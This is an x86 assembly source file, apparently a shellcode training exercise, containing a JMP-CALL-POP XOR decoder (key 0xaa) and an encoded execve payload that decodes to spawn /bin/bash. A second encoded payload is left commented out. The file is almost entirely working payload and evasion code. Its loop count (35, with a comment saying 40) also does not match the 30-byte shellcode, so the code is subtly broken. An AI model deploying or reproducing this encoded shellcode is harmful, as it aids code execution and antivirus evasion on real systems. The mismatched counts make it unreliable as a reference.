;Author: Eduardo
;Filename: xor_encoder.asm
;A xor encoded program which shellcode is decode in memory
;

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi
	xor ecx, ecx
	mov cl, 35 ; ecx --> counter to the loop

decode:
	xor byte [esi], 0xaa
	inc esi
	loop decode ; loop around 40 times

	jmp short Shellcode


call_decoder:

	call decoder
;	Shellcode: db 0x88,0x7a,0x39,0xe9,0xd1,0xdb,0xd8,0xca,0xd1,0xd1,0x96,0x96,0x96,0x96,0xd1,0x96,0xdb,0xd0,0xd7,0x7b,0x30,0x7a,0x1a,0xe9,0x7b,0x30,0x7a,0x1b,0xea,0x7b,0x30,0x7a,0x18,0x7b,0x9,0xb2,0x7a,0x34,0x7b,0x39
	; key: 0xaa
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0x85,0x85,0x85,0x85,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a

